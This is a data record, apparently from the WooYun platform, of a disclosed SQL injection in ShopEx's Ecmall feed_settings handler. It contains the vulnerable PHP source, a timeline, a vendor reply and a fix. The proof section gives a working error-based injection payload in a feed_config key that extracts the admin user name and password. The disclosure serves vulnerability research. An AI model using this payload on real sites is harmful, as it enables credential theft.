{"id": 1366, "wybug_id": "wooyun-2014-065340", "wybug_title": "Ecmall SQL Injection 3", "wybug_corp": "ShopEx", "wybug_author": "HackBraid", "wybug_date": "2014-06-18 10:37", "wybug_open_date": "2014-09-16 10:38", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-16：\t细节向公众公开  简要描述： 应该是这里的最后一处了 详细说明：  漏洞原理同 WooYun: Ecmall SQL Injection 2 这次出现在app/member.app.php\n/**     * Feed设置     *     * @author Garbin     * @param     * @return void     **/    function feed_settings()    {                if (!IS_POST)        {            /* 当前位置 */            $this->_curlocal(LANG::get('member_center'),  'index.php?app=member',                             LANG::get('feed_settings'));            /* 当前用户中心菜单 */            $this->_curitem('my_profile');            /* 当前所处子菜单 */            $this->_curmenu('feed_settings');            $this->_config_seo('title', Lang::get('user_center') . ' - ' . Lang::get('feed_settings'));            $user_feed_config = $this->visitor->get('feed_config');            $default_feed_config = Conf::get('default_feed_config');            $feed_config = !$user_feed_config ? $default_feed_config : unserialize($user_feed_config);            $buyer_feed_items = array(                'store_created' => Lang::get('feed_store_created.name'),                'order_created' => Lang::get('feed_order_created.name'),                'goods_collected' => Lang::get('feed_goods_collected.name'),                'store_collected' => Lang::get('feed_store_collected.name'),                'goods_evaluated' => Lang::get('feed_goods_evaluated.name'),                'groupbuy_joined' => Lang::get('feed_groupbuy_joined.name')            );            $seller_feed_items = array(                'goods_created' => Lang::get('feed_goods_created.name'),                'groupbuy_created' => Lang::get('feed_groupbuy_created.name'),            );            $feed_items = $buyer_feed_items;            if ($this->visitor->get('manage_store'))            {                $feed_items = array_merge($feed_items, $seller_feed_items);            }            $this->assign('feed_items', $feed_items);            $this->assign('feed_config', $feed_config);            $this->display('member.feed_settings.html');        }        else        {            $feed_settings = serialize($_POST['feed_config']); //问题出现在feed_config参数上            $m_member = &m('member');            $m_member->edit($this->visitor->get('user_id'), array(                'feed_config' => $feed_settings,            ));            $this->show_message('feed_settings_successfully');        }    }\n   漏洞证明：  http://localhost/ecmall/index.php?app=member&act=feed_settingspost提交数据：\nfeed_config[1'or (SELECT 1 FROM(SELECT count(*),concat(floor(rand(0)*2),(select concat(user_name,password) from ecm_member limit 0,1))x from information_schema.tables group by x)a)#]=v\n管理员账户密码：\n\n   修复方案：  修复同 WooYun: Ecmall SQL Injection 2 对feed_config的key进行危险字符过滤   版权声明：转载请注明来源 HackBraid@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2014-06-20 11:39 厂商回复： 非常感谢您为shopex信息安全做的贡献该漏洞在新版本中已经修复，请及时更新非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-18 11:15 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @ShopEx 确认确认！    \n     2014-06-18 11:38 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @HackBraid 不错吖    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}